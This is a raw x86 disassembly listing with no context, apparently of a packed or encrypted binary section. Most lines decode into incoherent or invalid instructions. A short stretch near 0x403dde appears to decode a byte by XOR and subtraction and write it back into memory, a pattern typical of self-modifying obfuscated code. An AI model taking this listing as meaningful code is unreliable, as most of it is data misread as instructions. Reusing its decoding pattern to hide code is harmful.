  403899:	(bad)  
  40389a:	cmp    BYTE PTR [esi+0x49],ah
  40389d:	sbb    esi,edx
  40389f:	xchg   ebx,eax
  4038a0:	jmp    0xc6c87605
  4038a5:	mov    dh,0xbb
  4038a7:	dec    eax
  4038a8:	or     eax,0x58a9a51c
  4038ad:	out    dx,eax
  4038ae:	xchg   ebx,eax
  4038af:	leave  
  4038b0:	dec    eax
  4038b1:	fst    QWORD PTR [ebx]
  4038b3:	nop
  4038b4:	dec    edi
  4038b5:	dec    edx
  4038b6:	popa   
  4038b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038b8:	pop    edi
  4038b9:	ficomp WORD PTR [ebx]
  4038bb:	sbb    al,0x53
  4038bd:	add    eax,DWORD PTR [edx]
  4038bf:	dec    ecx
  4038c0:	xchg   edi,eax
  4038c1:	adc    eax,0x4e30000e
  4038c6:	mov    ds:0x6a1d4470,eax
  4038cb:	test   al,0xe2
  4038cd:	push   esp
  4038ce:	(bad)  [edi-0x68]
  4038d1:	clc    
  4038d2:	and    BYTE PTR [esi],cl
  4038d4:	add    DWORD PTR ds:0x4c00ab02,0xffffffcb
  4038db:	mov    cl,0x19
  4038dd:	pop    es
  4038de:	or     dh,BYTE PTR [edi]
  4038e0:	aas    
  4038e1:	data16 hlt 
  4038e3:	aad    0xe4
  4038e5:	push   ecx
  4038e6:	loopne 0x4038e9
  4038e8:	mov    eax,DWORD PTR [esi]
  4038ea:	adc    BYTE PTR [ebx+0x7bec0dbf],al
  4038f0:	or     BYTE PTR ds:0x5d77606,ch
  4038f6:	xchg   ebx,eax
  4038f7:	adc    edx,DWORD PTR [ebx]
  4038f9:	sbb    DWORD PTR [eax],esp
  4038fb:	and    eax,0x395287d0
  403900:	leave  
  403901:	and    cl,0x38
  403904:	inc    edx
  403905:	sub    BYTE PTR [edi],al
  403907:	arpl   WORD PTR [edx+0x7ac8027],ax
  40390d:	sbb    al,dl
  40390f:	mov    bl,0x85
  403911:	sbb    eax,0x7d66b2ee
  403916:	fisttp WORD PTR [eax-0x1a1ceeac]
  40391c:	lods   eax,DWORD PTR ds:[esi]
  40391d:	int3   
  40391e:	mov    BYTE PTR [ebx-0x185e3d88],bl
  403924:	jmp    0x403909
  403926:	outs   dx,DWORD PTR ds:[esi]
  403927:	ret    0x808b
  40392a:	push   ecx
  40392b:	aad    0xdb
  40392d:	mov    al,ds:0xed7ed0b
  403932:	out    0xe5,al
  403934:	add    DWORD PTR [eax-0x7e],edi
  403937:	repz push ss
  403939:	adc    eax,0x39ad6f89
  40393e:	rcr    dh,cl
  403940:	sbb    esi,DWORD PTR [edx]
  403942:	out    dx,al
  403943:	loope  0x403939
  403945:	in     al,0x3a
  403947:	sar    DWORD PTR [ebp-0x4c],cl
  40394a:	fld    DWORD PTR [ebp+0x2f]
  40394d:	jge    0x4038ee
  40394f:	xchg   esi,eax
  403950:	jbe    0x40392b
  403952:	stos   BYTE PTR es:[edi],al
  403953:	les    eax,FWORD PTR [ebx-0x51]
  403956:	pop    ecx
  403957:	mov    ch,0xe7
  403959:	xlat   BYTE PTR ds:[ebx]
  40395a:	xor    ebp,ebp
  40395c:	iret   
  40395d:	test   eax,0x667b89e3
  403962:	aam    0x6
  403964:	sub    eax,ebp
  403966:	xor    bl,bl
  403968:	repnz sbb eax,DWORD PTR [edi+eiz*4+0x8]
  40396d:	adc    al,BYTE PTR [ecx-0x21]
  403970:	fcmovnbe st,st(6)
  403972:	pop    esi
  403973:	outs   dx,BYTE PTR ds:[esi]
  403974:	arpl   bp,cx
  403976:	mov    ecx,0x835ba90b
  40397b:	jp     0x40392b
  40397d:	stos   BYTE PTR es:[edi],al
  40397e:	jmp    0x39da:0xe07975ed
  403985:	jge    0x4039c1
  403987:	cmp    DWORD PTR [ecx],edx
  403989:	test   al,0x67
  40398b:	int    0xbe
  40398d:	int3   
  40398e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40398f:	out    dx,al
  403990:	leave  
  403991:	xchg   BYTE PTR [esi-0x30],cl
  403994:	test   eax,eax
  403996:	je     0x403dd2
  40399c:	lea    eax,[ebp-0x98]
  4039a2:	push   eax
  4039a3:	mov    eax,DWORD PTR [ebp-0x1c]
  4039a6:	xor    eax,esi
  4039a8:	add    eax,edi
  4039aa:	push   eax
  4039ab:	mov    eax,DWORD PTR [ebp-0x18]
  4039ae:	add    eax,0xee
  4039b3:	push   eax
  4039b4:	mov    eax,DWORD PTR [ebp-0x18]
  4039b7:	mov    eax,DWORD PTR [eax+0x198]
  4039bd:	push   DWORD PTR [eax]
  4039bf:	jmp    0x403dcd
  4039c4:	push   es
  4039c5:	js     0x403a2e
  4039c7:	repnz popa 
  4039c9:	jno    0x40395e
  4039cb:	call   0xb3ee171
  4039d0:	sbb    DWORD PTR [edx+0x1df7c160],0x7d6f7e7e
  4039da:	jle    0x403a5a
  4039dc:	dec    esi
  4039dd:	imul   eax,ebp,0xffffffff
  4039e0:	inc    ebp
  4039e1:	sub    eax,0xd7da353c
  4039e6:	lods   eax,DWORD PTR ds:[esi]
  4039e7:	test   eax,0x577a5ae0
  4039ec:	mov    ch,0xd9
  4039ee:	ins    DWORD PTR es:[edi],dx
  4039ef:	repz push ebx
  4039f1:	sub    ebp,DWORD PTR [esi-0x375fe62e]
  4039f7:	ret    
  4039f8:	fadd   st(0),st
  4039fa:	xchg   esi,eax
  4039fb:	cwde   
  4039fc:	cmp    DWORD PTR [edx],eax
  4039fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039ff:	call   0xb6e353a8
  403a04:	shl    BYTE PTR [ebx+0x20],1
  403a07:	rcr    DWORD PTR [ebx-0x35],cl
  403a0a:	or     eax,0xd4bb273b
  403a0f:	and    al,BYTE PTR [edx-0x6d]
  403a12:	test   ebx,ecx
  403a14:	push   0x872c6bff
  403a19:	pop    esp
  403a1a:	cmp    eax,0xbee38996
  403a1f:	popa   
  403a20:	xor    BYTE PTR [ebx-0x1fda2b40],dl
  403a26:	xor    eax,0xdf2a6a49
  403a2b:	loope  0x403a23
  403a2d:	aaa    
  403a2e:	js     0x403a55
  403a30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a31:	jle    0x403a6a
  403a33:	xchg   edx,eax
  403a34:	or     BYTE PTR [edx-0x6a],cl
  403a37:	lods   eax,DWORD PTR ds:[esi]
  403a38:	repz (bad) 
  403a3a:	out    dx,eax
  403a3b:	adc    eax,ebp
  403a3d:	fnstsw WORD PTR [ecx-0x26]
  403a40:	ins    DWORD PTR es:[edi],dx
  403a41:	sti    
  403a42:	cmp    BYTE PTR [edx],ch
  403a44:	sub    al,0x7
  403a46:	sub    esi,ebp
  403a48:	cmp    eax,0x9e374333
  403a4d:	das    
  403a4e:	jmp    0xc2f6:0x5666cd83
  403a55:	lahf   
  403a56:	std    
  403a57:	out    dx,al
  403a58:	ds cwde 
  403a5a:	cli    
  403a5b:	mov    bl,0xee
  403a5d:	cmp    bl,0x98
  403a60:	ret    0x55cc
  403a63:	fld    DWORD PTR [ecx]
  403a65:	scas   eax,DWORD PTR es:[edi]
  403a66:	push   0x42
  403a68:	ret    0x43e8
  403a6b:	imul   eax,DWORD PTR [ecx-0x4628b596],0x59b3b678
  403a75:	in     eax,dx
  403a76:	add    BYTE PTR [edx+0x5ea00c41],ch
  403a7c:	mov    al,0xa5
  403a7e:	std    
  403a7f:	dec    edx
  403a80:	ins    BYTE PTR es:[edi],dx
  403a81:	mov    BYTE PTR [eax+0x18],dh
  403a84:	inc    esp
  403a85:	rcl    DWORD PTR [ecx+0x6f722096],1
  403a8b:	mov    ah,0x70
  403a8d:	test   BYTE PTR [ebp+ebp*1+0x58],bh
  403a91:	jp     0x403ab5
  403a93:	and    esp,DWORD PTR [eax+0x1d2d37c2]
  403a99:	das    
  403a9a:	call   0xf13b2682
  403a9f:	icebp  
  403aa0:	pop    esp
  403aa1:	mov    cl,0x89
  403aa3:	pop    eax
  403aa4:	lock adc bl,BYTE PTR [edi-0x54]
  403aa8:	jbe    0x403ae5
  403aaa:	pop    edi
  403aab:	enter  0xf6,0xd9
  403aaf:	(bad)  
  403ab0:	lock pop es
  403ab2:	or     edi,DWORD PTR [edx+eiz*8-0x5f2bca6f]
  403ab9:	les    ebx,FWORD PTR [edi]
  403abb:	test   DWORD PTR [ecx+0x368a6be3],esp
  403ac1:	sbb    eax,0x880e98eb
  403ac6:	addr16 pop ss
  403ac8:	push   0x1e
  403aca:	jno    0x403b0c
  403acc:	xchg   ebx,eax
  403acd:	das    
  403ace:	es inc eax
  403ad0:	test   DWORD PTR [esi],0x39816f01
  403ad6:	aaa    
  403ad7:	arpl   WORD PTR [ecx-0x1bcf2d26],si
  403add:	shl    BYTE PTR ds:0x3930465f,1
  403ae3:	jno    0x403b41
  403ae5:	rcr    DWORD PTR [ecx+ebp*4],0x1c
  403ae9:	mov    dh,0x54
  403aeb:	cmp    ebx,DWORD PTR [esi]
  403aed:	test   al,0x79
  403aef:	ins    BYTE PTR es:[edi],dx
  403af0:	cs mov ebx,0x570567c2
  403af6:	and    ecx,ebp
  403af8:	cmp    eax,0xb9c93eac
  403afd:	push   cs
  403afe:	and    eax,0x3dfbf882
  403b03:	nop
  403b04:	jb     0x403b06
  403b06:	cmp    edx,edx
  403b08:	fs call 0xb03f:0x4500d02a
  403b10:	sar    BYTE PTR [ebp-0x55],cl
  403b13:	out    dx,eax
  403b14:	adc    BYTE PTR [edx],bl
  403b16:	retf   
  403b17:	sbb    ah,BYTE PTR [edx+0x73]
  403b1a:	popa   
  403b1b:	fisttp QWORD PTR [esi-0x7a]
  403b1e:	inc    edi
  403b1f:	ja     0x403ab0
  403b21:	push   es
  403b22:	cmp    ah,ah
  403b24:	mov    ds:0xe07355ed,al
  403b29:	popf   
  403b2a:	xor    ecx,edx
  403b2c:	push   esp
  403b2d:	fs add al,0xfc
  403b30:	dec    ebx
  403b31:	push   cs
  403b32:	test   cl,bl
  403b34:	addr16 mov bl,0xd1
  403b37:	test   BYTE PTR [esi+0x35],0x64
  403b3b:	jne    0x403b70
  403b3d:	dec    esi
  403b3e:	pop    edi
  403b3f:	clc    
  403b40:	inc    edi
  403b41:	mov    bl,0xdf
  403b43:	pop    eax
  403b44:	fisub  DWORD PTR [edi*2-0x224f9280]
  403b4b:	sahf   
  403b4c:	push   eax
  403b4d:	(bad)
  403b50:	sbb    esi,DWORD PTR [ebp+0x3c]
  403b53:	outs   dx,BYTE PTR ds:[esi]
  403b54:	stc    
  403b55:	loope  0x403b6d
  403b57:	xchg   esp,eax
  403b58:	ins    BYTE PTR es:[edi],dx
  403b59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b5a:	mov    al,ds:0x47ee4364
  403b5f:	mov    BYTE PTR [ebx-0xb66493c],0xb0
  403b66:	imul   ecx,DWORD PTR [ecx+0x5fc52a51],0x2e
  403b6d:	jl     0x403af8
  403b6f:	fld    QWORD PTR [ecx-0x2849b0b3]
  403b75:	adc    dl,ch
  403b77:	loop   0x403b85
  403b79:	aad    0x28
  403b7b:	mov    ds:0xa05ffd25,al
  403b80:	mov    cl,0xff
  403b82:	clc    
  403b83:	imul   DWORD PTR [ecx+ebp*2+0x72]
  403b87:	cdq    
  403b88:	xor    edx,DWORD PTR [esp+ecx*2-0x22d5821c]
  403b8f:	cmp    BYTE PTR [ebp+0x7737962f],bl
  403b95:	js     0x403bfb
  403b97:	pop    es
  403b98:	inc    eax
  403b99:	mov    ch,0x6f
  403b9b:	lock pop eax
  403b9d:	pop    ecx
  403b9e:	add    eax,eax
  403ba0:	push   esp
  403ba1:	and    eax,0x61da3e40
  403ba6:	jecxz  0x403c12
  403ba8:	xchg   ebx,eax
  403ba9:	mov    WORD PTR [edi+edi*2-0x1408e4a6],cs
  403bb0:	ss cs jg 0x403b36
  403bb4:	sub    ah,BYTE PTR [ebx-0x56aeb0ad]
  403bba:	sub    BYTE PTR ds:0xbfbd477,cl
  403bc0:	sbb    esi,DWORD PTR [edx-0x4f]
  403bc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bc4:	xchg   edi,eax
  403bc5:	test   al,0xd0
  403bc7:	mov    ds:0xf62a9e7a,eax
  403bcc:	pop    ss
  403bcd:	fdiv   DWORD PTR [edx+ecx*8]
  403bd0:	int3   
  403bd1:	lods   eax,DWORD PTR ds:[esi]
  403bd2:	pop    ds
  403bd3:	adc    al,0x79
  403bd5:	mov    cl,0x65
  403bd7:	popf   
  403bd8:	mov    dl,0x4a
  403bda:	and    eax,0xadd5bf86
  403bdf:	jmp    FWORD PTR [eax]
  403be1:	out    dx,eax
  403be2:	jp     0x403b83
  403be4:	popf   
  403be5:	jp     0x403c0b
  403be7:	pop    esp
  403be8:	cmp    bl,BYTE PTR [edx]
  403bea:	sbb    ah,al
  403bec:	push   ecx
  403bed:	xor    eax,DWORD PTR [ecx+0x34c6ded]
  403bf3:	and    cl,cl
  403bf5:	jge    0x403bea
  403bf7:	(bad)
  403bfa:	and    esi,0x45d770f
  403c00:	fcomp  DWORD PTR [eax+0x10]
  403c03:	test   edi,ebp
  403c05:	mov    edi,0x866805e9
  403c0a:	cld    
  403c0b:	mov    ds:0x437b21f2,eax
  403c10:	adc    edi,DWORD PTR [ebx-0x271cbe82]
  403c16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c17:	mov    edx,0x5cdee9e5
  403c1c:	mov    esi,0xcd876b0a
  403c21:	sti    
  403c22:	sub    BYTE PTR [edx+0x12],cl
  403c25:	cmp    BYTE PTR [esi-0x6],ah
  403c28:	enter  0xcfc0,0x7c
  403c2c:	cld    
  403c2d:	pop    esp
  403c2e:	add    edi,DWORD PTR [esi*4-0x1de2effa]
  403c35:	frstor [ebx-0x87b93db]
  403c3b:	cld    
  403c3c:	pushf  
  403c3d:	clc    
  403c3e:	cmp    al,0x18
  403c40:	mov    bh,0x76
  403c42:	aad    0x57
  403c44:	jp     0x403bfe
  403c46:	inc    esi
  403c47:	test   DWORD PTR [ebp*8-0x20bd50e],ebx
  403c4e:	repnz push di
  403c51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c52:	retf   
  403c53:	and    eax,0xc5d38d91
  403c58:	shl    BYTE PTR [ecx-0x51],cl
  403c5b:	scas   al,BYTE PTR es:[edi]
  403c5c:	sub    al,0x49
  403c5e:	mov    bl,0xd6
  403c60:	pop    ecx
  403c61:	das    
  403c62:	jmp    0x1291:0x6f179a92
  403c69:	iret   
  403c6a:	outs   dx,BYTE PTR ds:[esi]
  403c6b:	jne    0x403c6e
  403c6d:	loop   0x403ca6
  403c6f:	lods   al,BYTE PTR ds:[esi]
  403c70:	sub    eax,0x22e86c90
  403c75:	adc    DWORD PTR [ebp+0x6c6024b5],ecx
  403c7b:	push   0xffffffd9
  403c7d:	loope  0x403caa
  403c7f:	or     BYTE PTR [edx],0xb6
  403c82:	std    
  403c83:	lahf   
  403c84:	mov    DWORD PTR ds:0x530e971d,esp
  403c8a:	ret    0x7e3d
  403c8d:	cmp    ecx,DWORD PTR [ebx-0x47]
  403c90:	push   es
  403c91:	lods   al,BYTE PTR ds:[esi]
  403c92:	aad    0x2c
  403c94:	jbe    0x403c8a
  403c96:	jae    0x403d05
  403c98:	xchg   ecx,eax
  403c99:	nop
  403c9a:	aad    0x47
  403c9c:	mov    esi,0x2c9e5db8
  403ca1:	mov    edi,0xe024e2ba
  403ca6:	xchg   ebp,eax
  403ca7:	mov    eax,0xd2e85f09
  403cac:	out    0xac,eax
  403cae:	dec    esp
  403caf:	stos   BYTE PTR es:[edi],al
  403cb0:	mov    eax,DWORD PTR [edx]
  403cb2:	push   eax
  403cb3:	or     BYTE PTR [edx+0x64413f53],al
  403cb9:	data16 ins BYTE PTR es:[edi],dx
  403cbb:	leave  
  403cbc:	adc    al,0xce
  403cbe:	mov    ah,0x9a
  403cc0:	pusha  
  403cc1:	imul   cl
  403cc3:	in     al,dx
  403cc4:	push   ds
  403cc5:	jns    0x403d05
  403cc7:	into   
  403cc8:	out    dx,eax
  403cc9:	mov    edi,0x30b27211
  403cce:	mov    ch,0x3b
  403cd0:	mov    edi,0xe669e302
  403cd5:	jmp    0x403d0d
  403cd7:	call   0xd9f14467
  403cdc:	fmul   DWORD PTR ds:0xc1661939
  403ce2:	mov    ds:0x2e3d4f90,al
  403ce7:	ins    BYTE PTR es:[edi],dx
  403ce8:	inc    edi
  403ce9:	les    edi,FWORD PTR [ebp+0x6a]
  403cec:	test   eax,0x38e3518f
  403cf1:	retf   0xab9d
  403cf4:	out    0x33,eax
  403cf6:	(bad)  
  403cf7:	jmp    0x647f4192
  403cfc:	fild   WORD PTR [eax+esi*1-0x528eb8ab]
  403d03:	jmp    0x451f5da5
  403d08:	and    al,BYTE PTR [edx]
  403d0a:	push   ebp
  403d0b:	or     al,0xbb
  403d0d:	mov    eax,0x4efc1036
  403d12:	push   cs
  403d13:	call   edi
  403d15:	lods   eax,DWORD PTR ds:[esi]
  403d16:	add    bh,dh
  403d18:	sbb    al,0x6c
  403d1a:	mov    ds:0xa55cacf2,al
  403d1f:	ins    BYTE PTR es:[edi],dx
  403d20:	ins    BYTE PTR es:[edi],dx
  403d21:	gs jnp 0x403cac
  403d24:	mov    ah,0xd1
  403d26:	sub    ch,BYTE PTR [edi]
  403d28:	xchg   eax,edx
  403d2a:	adc    BYTE PTR [ecx],ch
  403d2c:	out    0x8d,eax
  403d2e:	pushf  
  403d2f:	mov    eax,ds:0x12c8ec07
  403d34:	repz in al,dx
  403d36:	and    BYTE PTR [edi],bh
  403d38:	sub    cl,BYTE PTR [esi-0x3658274b]
  403d3e:	cmp    ah,cl
  403d40:	push   ss
  403d41:	push   0xdfadf8a5
  403d46:	jl     0x403d16
  403d48:	push   esp
  403d49:	ds jp  0x403d49
  403d4c:	mov    ah,0x56
  403d4e:	dec    edi
  403d4f:	sbb    DWORD PTR [ecx-0x48],esp
  403d52:	cmp    ecx,DWORD PTR [eax+0x7cc08b05]
  403d58:	fdiv   QWORD PTR [eax-0x54432baf]
  403d5f:	repz mov edx,0x89f190b7
  403d65:	jl     0x403d1c
  403d67:	mov    bh,0xce
  403d69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d6a:	push   es
  403d6b:	repz sbb al,BYTE PTR [esi+0x2d35cd9c]
  403d72:	das    
  403d73:	cmp    ch,BYTE PTR [esi]
  403d75:	adc    eax,esi
  403d77:	xor    DWORD PTR [esi+0x55],edi
  403d7a:	popa   
  403d7b:	xchg   esi,eax
  403d7c:	mov    WORD PTR [edx-0x1cedf40c],cs
  403d82:	sub    al,0x3f
  403d84:	iret   
  403d85:	cs rol cl,0x6e
  403d89:	xchg   edi,ebp
  403d8b:	pop    ds
  403d8c:	jae    0x403d30
  403d8e:	adc    eax,0xba2ccb10
  403d93:	jmp    0x403de6
  403d95:	mov    ecx,0x1d6036b4
  403d9a:	mov    dl,0x86
  403d9c:	add    al,0x2e
  403d9e:	int    0x58
  403da0:	pop    es
  403da1:	push   ebp
  403da2:	pop    esi
  403da3:	fs popf 
  403da5:	test   DWORD PTR [ebx-0x1afafeec],0x5f83b722
  403daf:	ss aas 
  403db1:	clc    
  403db2:	test   BYTE PTR [edi+0x3a],0x1d
  403db6:	pop    ebx
  403db7:	jmp    0x46723d79
  403dbc:	(bad)  
  403dbd:	xchg   esi,eax
  403dbe:	cmp    DWORD PTR [ebp-0x5],ebx
  403dc1:	rol    DWORD PTR [ebp+0x73],1
  403dc4:	test   DWORD PTR [edx],esi
  403dc6:	inc    ecx
  403dc7:	sub    al,0xba
  403dc9:	mov    edx,0xe8aad72e
  403dce:	mov    DWORD PTR [edx+0x4d8b0000],0xb8ce33d8
  403dd8:	gs (bad) 
  403dda:	int    0xff
  403ddc:	sub    eax,ecx
  403dde:	sub    eax,DWORD PTR [ebp-0x4]
  403de1:	mov    ecx,DWORD PTR [ebp-0x48]
  403de4:	add    ecx,eax
  403de6:	mov    eax,DWORD PTR [ebp-0x4]
  403de9:	mov    DWORD PTR [eax+0x1],ecx
  403dec:	mov    al,BYTE PTR [ebp-0x11]
  403def:	mov    ecx,DWORD PTR [ebp-0x4]
  403df2:	xor    al,0x46
  403df4:	sub    al,0x38
  403df6:	mov    BYTE PTR [ecx],al
  403df8:	lea    eax,[ebp-0x4]
  403dfb:	inc    BYTE PTR [eax]
  403dfd:	inc    eax
  403dfe:	push   eax
  403dff:	pop    ecx
  403e00:	dec    ecx
  403e01:	jmp    0x40420f
  403e06:	dec    esp
  403e07:	repz repz adc esi,DWORD PTR [ecx+0x13]
  403e0c:	ins    BYTE PTR es:[edi],dx
  403e0d:	jno    0x403e09
  403e0f:	in     eax,0x73
  403e11:	sbb    DWORD PTR [edx],ebp
  403e13:	sub    ch,BYTE PTR [eax+0x7e19e4f8]
  403e19:	jle    0x403e8a
  403e1b:	jge    0x403e9b
  403e1d:	jle    0x403e34
  403e1f:	cmp    DWORD PTR [eax+ebp*1-0x36ec3cdd],ebp
  403e26:	cmp    dl,bh
  403e28:	cmp    BYTE PTR [edi],al
  403e2a:	mov    al,0xba
  403e2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e2d:	(bad)  
  403e2e:	retf   0xf8fd
  403e31:	mov    al,0xb0
  403e33:	aaa    
  403e34:	mov    al,0x2e
  403e36:	iret   
  403e37:	adc    al,BYTE PTR [eax+esi*2-0x6e]
  403e3b:	lea    edx,ds:0xc32b281f
  403e41:	std    
  403e42:	dec    edi
  403e43:	lock jle 0x403e7f
  403e46:	std    
  403e47:	xchg   edx,eax
  403e48:	fwait
  403e49:	mov    ?,WORD PTR [esi-0x45]
  403e4c:	popf   
  403e4d:	jge    0x403e33
  403e4f:	push   edi
  403e50:	cmp    eax,0x311a47ba
  403e55:	pop    ss
  403e56:	dec    BYTE PTR [eax]
  403e58:	scas   eax,DWORD PTR es:[edi]
  403e59:	xor    dh,BYTE PTR [ebp+0x69]
  403e5c:	inc    esp
  403e5d:	out    dx,al
  403e5e:	(bad)  
  403e5f:	mov    ebp,0x85beabd0
  403e64:	ficomp WORD PTR [ebx-0x6]
  403e67:	sar    BYTE PTR [edx-0x6b092b71],cl
  403e6d:	xchg   BYTE PTR [edx-0x2fc96d02],cl
  403e73:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  403e75:	cdq    
  403e76:	pop    edi
  403e77:	jmp    0xa460:0x4b5a2e45
  403e7e:	out    0xa2,al
  403e80:	fimul  DWORD PTR ds:0xc0bb665d
  403e86:	mov    ebx,0x8839f5eb
  403e8b:	mov    esi,0x80e3b7d0
  403e90:	adc    BYTE PTR [ecx+esi*4-0x3db997e8],cl
  403e97:	in     al,dx
  403e98:	pop    esp
  403e99:	mov    WORD PTR [ebx-0x72],ss
  403e9c:	fwait
  403e9d:	cmp    eax,0x70d088b9
  403ea2:	pop    edx
  403ea3:	(bad)  
  403ea4:	cmc    
  403ea5:	and    cl,BYTE PTR [esi-0x76]
  403ea8:	scas   eax,DWORD PTR es:[edi]
  403ea9:	cs popf 
  403eab:	aad    0x54
  403ead:	popf   
  403eae:	cmp    al,0x47
  403eb0:	adc    al,0x29
  403eb2:	enter  0xdc11,0xea
  403eb6:	push   eax
  403eb7:	xchg   ebx,eax
  403eb8:	cli    
  403eb9:	loop   0x403e62
  403ebb:	xor    BYTE PTR [edx-0xe63f474],cl
  403ec1:	jmp    0xa32ab223
  403ec6:	pop    esi
  403ec7:	inc    esi
  403ec8:	xchg   edi,eax
  403ec9:	(bad)  
  403eca:	jle    0x403f38
  403ecc:	test   DWORD PTR [eax],ecx
  403ece:	inc    esi
  403ecf:	inc    ecx
  403ed0:	ret    0x51b1
  403ed3:	arpl   dx,sp
  403ed5:	pop    ebx
  403ed6:	rcr    DWORD PTR [ebp+0x55d1b66],cl
  403edc:	cmp    BYTE PTR [ecx-0x349e633c],ch
  403ee2:	or     DWORD PTR [eax],eax
  403ee4:	inc    ebp
  403ee5:	xor    DWORD PTR ss:[ebx+0x19a454d6],0x2c
  403eed:	imul   esp,DWORD PTR [eax+ebp*8+0x26],0xffffffcb
  403ef2:	(bad)  
  403ef3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ef4:	jg     0x403e80
  403ef6:	inc    ebx
  403ef7:	xor    al,0xf6
  403ef9:	ror    ebx,1
  403efb:	pusha  
  403efc:	cmp    eax,0x88e98c7
  403f01:	pop    ebx
  403f02:	pop    es
  403f03:	pushw  cs
  403f05:	jns    0x403e92
  403f07:	mov    bh,0xe3
  403f09:	stos   DWORD PTR es:[edi],eax
  403f0a:	inc    esi
  403f0b:	std    
  403f0c:	cld    
  403f0d:	nop
  403f0e:	arpl   WORD PTR [ebx+0x11271318],bp
  403f14:	into   
  403f15:	cmp    DWORD PTR [esi],edi
  403f17:	mov    esp,0x262cd5ba
  403f1c:	bound  eax,QWORD PTR [ecx-0x59322305]
  403f22:	and    edx,eax
  403f24:	dec    edi
  403f25:	retf   0x4eae
  403f28:	out    dx,eax
  403f29:	dec    edi
  403f2a:	out    dx,eax
  403f2b:	sub    DWORD PTR [ebp-0x7e],ebx
  403f2e:	add    BYTE PTR [edi+0x5d],ch
  403f31:	mov    BYTE PTR [ecx-0x23524c9a],dl
  403f37:	push   esi
  403f38:	pop    edi
  403f39:	(bad)  
  403f3a:	jle    0x403ed7
  403f3c:	sbb    eax,0x5d804394
  403f41:	test   BYTE PTR [ebx-0x30],0x6
  403f45:	pop    ss
  403f46:	cmp    al,0xfb
  403f48:	stc    
  403f49:	or     eax,0xc22b5601
  403f4e:	mov    ecx,0x8ac2d398
  403f53:	mov    ?,WORD PTR [ebp+eax*1-0x2c]
  403f57:	(bad)  
  403f58:	jo     0x403fd7
  403f5a:	or     edi,DWORD PTR [ebp+0x1b]
  403f5d:	mov    dh,0xcc
  403f5f:	sub    ch,BYTE PTR [edi+0x5726be40]
  403f65:	dec    esi
  403f66:	pop    ecx
  403f67:	idiv   cl
  403f69:	nop
  403f6a:	jno    0x403f4f
  403f6c:	or     al,BYTE PTR [eax+0x2bb8b44f]
  403f72:	(bad)  [edx]
  403f74:	leave  
  403f75:	outs   dx,BYTE PTR ds:[esi]
  403f76:	out    dx,al
  403f77:	cmp    eax,0x71cf63b3
  403f7c:	aas    
  403f7d:	sub    DWORD PTR [edx+0x49],0x16
  403f81:	inc    ebp
  403f82:	and    al,0xaa
  403f84:	pop    ss
  403f85:	push   cs
  403f86:	fnsave [edi+0x5c]
  403f89:	xor    DWORD PTR [edi+0x7d35ea0e],eax
  403f8f:	lods   al,BYTE PTR ds:[esi]
  403f90:	jnp    0x403fc6
  403f92:	lea    esi,[ecx]
  403f94:	adc    ebx,0xffffffb6
  403f97:	adc    eax,0x5b221d01
  403f9c:	sbb    edx,esi
  403f9e:	popa   
  403f9f:	sbb    al,0x87
  403fa1:	fidivr WORD PTR [edi-0x42a6d0e2]
  403fa7:	sti    
  403fa8:	and    al,ch
  403faa:	inc    edi
  403fab:	jg     0x404026
  403fad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fae:	rol    BYTE PTR [ecx-0x2d],cl
  403fb1:	fadd   st,st(2)
  403fb3:	nop
  403fb4:	mov    bh,0x85
  403fb6:	stos   DWORD PTR es:[di],eax
  403fb8:	jns    0x403f8a
  403fba:	mul    DWORD PTR [ebx]
  403fbc:	jp     0x403f83
  403fbe:	ffreep st(3)
  403fc0:	fidiv  WORD PTR [edi-0x43]
  403fc3:	push   0xffffffcf
  403fc5:	push   0x21
  403fc7:	std    
  403fc8:	(bad)  
  403fc9:	mov    ecx,0xf25dd073
  403fce:	xor    al,0x50
  403fd0:	ds std 
  403fd2:	cmp    esi,DWORD PTR [ebx+0x20]
  403fd5:	gs (bad) 
  403fd7:	mov    cl,BYTE PTR [edx+0x53892d9a]
  403fdd:	ret    
  403fde:	cmp    BYTE PTR [esi+0x6acf6a9a],0xa
  403fe5:	cmp    ch,BYTE PTR [ebx+0x41557881]
  403feb:	cld    
  403fec:	sub    al,0x67
  403fee:	jae    0x403fda
  403ff0:	xchg   edi,eax
  403ff1:	sub    dh,ah
  403ff3:	jns    0x40402e
  403ff5:	sub    ch,al
  403ff7:	idiv   BYTE PTR [eax+0x1b]
  403ffa:	inc    esp
  403ffb:	cmp    ebp,DWORD PTR [esi+0x49d95cb8]
  404001:	xchg   ebp,eax
  404002:	(bad)  
  404003:	sbb    al,bl
  404005:	inc    esi
  404006:	dec    ecx
  404007:	pop    ecx
  404008:	loop   0x403fa1
  40400a:	loope  0x404046
  40400c:	out    0x75,eax
  40400e:	(bad)  
  404010:	lds    ebp,FWORD PTR [edi+edi*2]
  404013:	mov    bl,0xb1
  404015:	bound  ecx,QWORD PTR [edx-0x63]
  404018:	pop    esp
  404019:	rcl    BYTE PTR [esi],0xed
  40401c:	mov    al,0x73
  40401e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40401f:	test   al,0x10
  404021:	mov    DWORD PTR [eax-0x61aedbd8],esp
  404027:	enter  0xc0eb,0x36
  40402b:	les    esi,FWORD PTR [edx-0x5d]
  40402e:	inc    eax
  40402f:	test   al,0x19
  404031:	mov    edx,0xe2ec4361
  404036:	shl    al,0x89
  404039:	(bad)  
  40403b:	sub    cl,BYTE PTR [edi-0x78]
  40403e:	loop   0x40402c
  404040:	pop    es
  404041:	mov    ds:0x2af3c9df,eax
  404046:	setnp  BYTE PTR [eax]
  404049:	mov    DWORD PTR [eax+0x24],esp
  40404c:	in     eax,dx
  40404d:	add    eax,ecx
  40404f:	cmp    ecx,DWORD PTR [ebp-0x4fb095d]
  404055:	loopne 0x40404c
  404057:	add    cl,BYTE PTR [esp+eax*4]
